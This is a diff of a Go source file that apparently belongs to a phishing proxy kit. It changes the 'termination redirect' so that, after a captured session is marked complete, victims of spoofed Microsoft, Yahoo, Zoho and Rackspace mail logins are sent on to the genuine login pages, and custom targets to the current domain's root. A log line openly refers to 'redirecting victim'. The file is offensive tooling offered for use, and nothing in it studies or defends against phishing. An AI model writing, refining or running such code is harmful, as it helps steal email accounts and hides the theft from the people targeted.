@@ -6,20 +6,18 @@ import (
 	"strings"
 )
 
-// ══════════════════════════════════════════════════════════
-//  TERMINATION REDIRECT
+// ═════════════════════════════════════════════════════════
+//  TERMINATION REDIRECT (Points to LOGIN pages, not mailboxes)
 // ══════════════════════════════════════════════════════════
 
 var terminationURLs = map[string]string{
-	"Microsoft 365":        "https://www.office.com",
-	"Turbify (Yahoo Mail)": "https://mail.turbify.com",
-	"Microsoft (Personal)": "https://outlook.live.com",
-	"Yahoo Mail":           "https://mail.yahoo.com", // ← add
+	"Microsoft 365":        "https://login.microsoftonline.com",
+	"Turbify (Yahoo Mail)": "https://login.yahoo.com",
+	"Microsoft (Personal)": "https://login.live.com",
+	"Yahoo Mail":           "https://login.yahoo.com",
+	"Zoho Mail":            "https://accounts.zoho.com/signin",
 	"Rackspace Webmail":    "https://apps.rackspace.com/",
-	"Zoho Mail":            "https://mail.zoho.com/",
 }
-
-const defaultTerminateURL = "https://www.office.com"
 
 func shouldTerminate(s *Session, r *http.Request) bool {
 	if s == nil || !s.IsDone {
@@ -58,9 +56,13 @@ func shouldTerminate(s *Session, r *http.Request) bool {
 }
 
 func doTerminate(w http.ResponseWriter, s *Session, r *http.Request) {
-	targetURL := defaultTerminateURL
+	// 1. Check the predefined map for known providers
+	targetURL := "https://login.microsoftonline.com" // Safe default fallback
 	if url, ok := terminationURLs[s.TargetName]; ok {
 		targetURL = url
+	} else if s.TargetName != "" {
+		// 2. Fallback for custom targets: redirect to the root of the current domain
+		targetURL = "https://" + baseDomainOf(r) + "/"
 	}
 
 	fmt.Printf("\n[✓] [%d] [%s] SESSION COMPLETE — redirecting victim to %s\n",
